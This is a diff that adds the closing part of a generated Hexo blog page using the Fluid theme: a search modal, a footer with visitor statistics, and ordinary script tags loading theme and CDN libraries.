+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div style="font-size: 0.85rem"> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/custom/RunTime/RunTime.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="/custom/LoadingBar/pace.min.js"></script>
+<script src="/js/scrollAnimation.js"></script>
+<script src="/js/snow.js"></script>
+<script src="/custom/ReadingProgress/ReadingProgress.js"></script>
+<script src="/js/DynamicLine.js"></script>
+<script src="/js/RandomBanner.js"></script>
+<script src="/js/Background.js"></script>
+<script src="/js/Sidebar.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<!-- hexo injector body_end start -->
+<script src="https://cdn.jsdelivr.net/npm/hexo-shiki-plugin@latest/lib/codeblock.js"></script>
+
+  <script>
+  const CODE_CONFIG = {
+    beautify: true,
+    highlightCopy: true,
+    highlightLang: true,
+    highlightHeightLimit: 360,
+    isHighlightShrink: false,
+    copy: {
+      success: 'Copy Success',
+      error: 'Copy Error',
+      noSupport: 'Browser Not Support',
+    }
+  };
+  console.log(
+    `%c hexo-shiki-plugin %c v1.0.27 %c https://github.com/nova1751/hexo-shiki-plugin`,
+    "color: #fff; background: #5f5f5f",
+    "color: #fff; background: #80c8f8",
+    ""
+  );
+  </script>
+  <!-- hexo injector body_end end --></body>
+</html>
